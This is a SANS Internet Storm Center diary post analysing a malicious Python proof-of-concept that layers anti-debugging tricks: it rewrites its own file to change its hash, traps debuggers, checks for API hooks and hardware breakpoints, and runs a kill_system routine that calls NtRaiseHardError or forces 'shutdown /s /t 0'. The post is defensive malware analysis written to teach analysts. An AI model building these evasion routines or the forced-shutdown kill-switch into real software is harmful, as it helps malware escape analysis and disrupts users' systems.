---
title: The Unbreakable Multi-Layer Anti-Debugging System, (Thu, Feb 6th)
url: https://isc.sans.edu/diary/rss/31658
source: SANS Internet Storm Center, InfoCON: green
date: 2025-02-07
fetch_date: 2025-10-06T20:47:04.804493
---

# The Unbreakable Multi-Layer Anti-Debugging System, (Thu, Feb 6th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31654)
* [next](/diary/31660)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [The Unbreakable Multi-Layer Anti-Debugging System](/forums/diary/The%2BUnbreakable%2BMultiLayer%2BAntiDebugging%2BSystem/31658/)

**Published**: 2025-02-06. **Last Updated**: 2025-02-06 08:08:26 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/The%2BUnbreakable%2BMultiLayer%2BAntiDebugging%2BSystem/31658/#comments)

The title of this diary is based on the string I found in a malicious Python script that implements many anti-debugging techniques. If some were common, others were interesting and demonstrated how low-level high-level languages like Python can access operating system information. Let’s review some of them!

Anti-debugging techniques are like a cat-and-mouse game. If you’re interested in malware analysis, this will show you how your task can be much more challenging if you’re prepared to face them. The file was found on VT with a low score of 2/62[[1](https://www.virustotal.com/gui/file/3a216b238bae042312ab810c0d07fdc49e8eddc97a2dec3958fb6b1f4ecd4612/detection)] (SHA256: 3a216b238bae042312ab810c0d07fdc49e8eddc97a2dec3958fb6b1f4ecd4612). The file just contains only anti-debugging stuff and not real malware. I suspect the file to be a proof-of-concept.

The script is multi-threaded and launches all the techniques in parallel:

```

def anti_debug_check():
    """ ? The Unbreakable Multi-Layer Anti-Debugging System """
    threads = [
        threading.Thread(target=detect_debugger),
        threading.Thread(target=detect_debugger_processes),
        threading.Thread(target=detect_vm),
        threading.Thread(target=detect_api_hooks),
        threading.Thread(target=detect_breakpoints),
        threading.Thread(target=detect_sandbox),
        threading.Thread(target=detect_cpu_usage),
        threading.Thread(target=detect_memory_tampering),
        threading.Thread(target=detect_mouse_movements),
        threading.Thread(target=detect_execution_speed),
        threading.Thread(target=detect_registry_keys),
        threading.Thread(target=detect_screenshot),
        threading.Thread(target=infinite_loop_debugger_trap),
        threading.Thread(target=inject_fake_code),
        threading.Thread(target=polymorphic_self_mutation)
    ]
    for t in threads:
        t.daemon = True
        t.start()
    for t in threads:
        t.join()
```

Let’s focus on the interesting ones. « polymorphic\_self\_mutation » will change the Python script file. In a Python program, the variable "\_\_file\_\_" contains the path of the currently executed script. This variable is used to read the content of the script, randomize the lines, and overwrite it:

```

def polymorphic_self_mutation():
    """ ? Self-Mutating Code to Avoid Static Analysis """
    with open(__file__, "r", encoding="utf-8") as f:
        lines = f.readlines()
    with open(__file__, "w", encoding="utf-8") as f:
        random.shuffle(lines)
        f.writelines(lines)
```

The new file will have, for example, a different hash and will be more difficult to hunt.

The next technique is a typical Python trick provided by sys.gettrace[[2](https://docs.python.org/3/library/sys.html#sys.gettrace)]. If a debugger is attached to the Python process, this function will return a trace function. The purpose of this technique is to loop forever if a debugger is attached to the Python script.

```

def infinite_loop_debugger_trap():
    """ ? If Debugger is Attached, Trap it in an Infinite Loop """
    while sys.gettrace():
        pass  # Debugger is stuck here forever
```

I like the « memory tampering » technique: The script computes its hash and recheck it at regular intervals:

```

def detect_memory_tampering():
    original_hash = hashlib.md5(open(sys.argv[0], "rb").read()).hexdigest()
    while True:
        time.sleep(2)
        current_hash = hashlib.md5(open(sys.argv[0], "rb").read()).hexdigest()
        if current_hash != original_hash:
            kill_system()
```

The next one relies on the API call IsDebuggerPresent(). This one is often hooked to prevent the simple detection of a debugger. The value 0xE9 is the op-code for a long jump… This hooking technique is called « trampoline ». If the very first byte of the API call loaded in memory is 0xE9, it has been hooked!

```

def detect_api_hooks():
    kernel32 = ctypes.windll.kernel32
    original_bytes = ctypes.create_string_buffer(5)
    kernel32.ReadProcessMemory(kernel32.GetCurrentProcess(), kernel32.IsDebuggerPresent, original_bytes, 5, None)
    if original_bytes.raw[0] == 0xE9:  # Hook detected
        kill_system()
```

When you debug, you probably use breakpoints, right? The following code helps to detect hardware breakpoints:

```

def detect_breakpoints():
    context = ctypes.create_string_buffer(0x4C)
    context_ptr = ctypes.byref(context)
    context_offset = struct.calcsize("Q") * 6
    ctypes.windll.kernel32.RtlCaptureContext(context_ptr)
    dr0, dr1, dr2, dr3 = struct.unpack_from("4Q", context.raw, context_offset)
    if dr0 or dr1 or dr2 or dr3:
        kill_system()
```

Hardware breakpoints are used to avoid patching the program. They contain the address where to pause the execution. Hardware breakpoints are CPU registers: DRO to DR3 (on Intel CPU’s). RtlCaptureContext()[[3](https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext)] is used to get the current threat’s execution state which includes the registers. With the help of unpack, the script fills the variable corresponding to the registers, if one of them is not empty, there is a hardware breakpoint defined!

Other checks are really common: detection of suspicious process names, and specific registry keys, … I'll not cover them.

You can see that all functions will call kill\_system() if tests are successful. This function will just annoy the malware analysts by crashing (or trying to crash) the system:

```

def kill_system():
    """ ? THE ULTIMATE KILL-SWITCH ? """
    try:
        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except:
        os.system("shutdown /s /t 0")  # Force shutdown
```

The purpose of the function is easy to understand but when NtRaiseHardError[[4](https://github.com/AgnivaMaity/NtRaiseHardError-Example)] is invoked, it does not automatically cause a kernel panic or system-wide crash. Instead, the system can handle the error in various ways, including logging the event, presenting an error dialog, or terminating the application that called the function. I tried in a VM:

```

C:\Users\REM>python
Python 3.5.2 (v3.5.2:4def2a2901a5, Jun 25 2016, 22:18:55) [MSC v.1900 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import ctypes
>>> ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
-1073741727
>>>
```

When you convert the value -1073741727 to hexadecimal, you get 0xC000001F, which is a Windows NTSTATUS code. Specifically, this error code indicates a STATUS\_INVALID\_PARAMETER error...

The Python script is a great example of multiple techniques that can be implemented in malware!

[1] <https://www.virustotal.com/gui/file/3a216b238bae042312ab810c0d07fdc49e8eddc97a2dec3958fb6b1f4ecd4612/detection>
[2] <https://docs.python.org/3/library/sys.html#sys.gettrace>
[3] <https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext>
[4] <https://github.com/Agniva...